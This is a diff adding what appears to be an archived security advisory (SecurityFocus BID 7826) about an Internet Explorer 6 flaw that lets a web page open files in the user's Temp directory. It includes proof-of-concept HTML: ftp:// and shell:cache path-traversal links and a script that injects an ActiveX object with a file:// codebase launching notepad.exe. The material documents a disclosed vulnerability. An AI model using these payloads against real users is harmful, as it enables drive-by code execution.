@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/7826/info
+
+Microsoft Internet Explorer is prone to an issue which could permit an attacker to load a known, existing file in a user's temporary directory (or possibly other directories in a user's profile). It is possible to exploit this issue via a malicious web page or HTML document. Exploitation would either require that an attacker already knows of a file in the user's temporary directory or that the attacker can place an arbitrary file in this directory.
+
+This issue was reported to affect Internet Explorer 6, however, earlier versions may also be prone to this weakness. 
+
+[ftpexp.html]
+<html>
+<a href="ftp://%@/../../../../Local Settings/Temp/exploit.html" TYPE="text/html" target="_blank">Exploit</a>
+</html>
+
+The must click the exploit link, which loads the following file (which must exist in the user's Temp directory):
+
+[exploit.html]
+<html>
+<script>setTimeout(function(){document.body.innerHTML='<object classid="clsid:11111111-1111-1111-1111-111111111111"
+codebase="file://c:/winnt/notepad.exe"></object>'}, 0);</script>
+</html>
+
+The following will read the file %TEMP%\exploit.html on a Windows 2003 system:
+
+<a href="shell:cache\..\..\Local Settings\Temp\exploit.html">Exploit</a> 
